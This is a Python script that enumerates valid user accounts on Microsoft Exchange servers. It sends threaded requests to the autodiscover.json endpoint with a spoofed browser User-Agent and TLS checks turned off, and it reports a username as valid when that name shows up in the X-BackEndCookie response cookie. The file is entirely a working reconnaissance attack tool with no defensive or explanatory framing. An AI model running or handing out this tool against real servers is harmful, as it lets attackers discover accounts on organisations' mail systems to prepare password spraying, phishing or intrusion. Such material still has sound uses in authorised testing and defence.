import logging
import os
from concurrent.futures import ThreadPoolExecutor

import click
import requests


def read_file(path: str) -> list[str] | None:
    if not os.path.isfile(path):
        return None

    with open(path, "rt") as handle:
        return handle.read().split()


def check_user(user: str, target: str) -> bool:
    response = requests.get(
        f"{target}/autodiscover/autodiscover.json/v1.0/{user}?Protocol=Autodiscoverv1&RedirectCount=1",
        headers={
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        },
        verify=False,
    )

    backend_cookie: str | None = response.cookies.get("X-BackEndCookie")

    if backend_cookie is not None and user in backend_cookie:
        logging.info(f'[+] Valid user: "{user}" for autodiscover server: "{target}"')


@click.command()
@click.option(
    "--targets",
    "-t",
    "entity_targets",
    required=True,
    type=str,
    help="Target or path to file with targets.",
)
@click.option(
    "--users",
    "-u",
    "entity_users",
    required=True,
    type=str,
    help="User or path to file with users.",
)
@click.option("--threads", default=40, type=int, help="Count of threads.")
def main(entity_targets: str, entity_users: str, threads: int):

    targets = read_file(entity_targets) or [entity_targets]
    users = read_file(entity_users) or [entity_users]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for target in targets:
            for user in users:
                executor.submit(check_user, user, target)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()
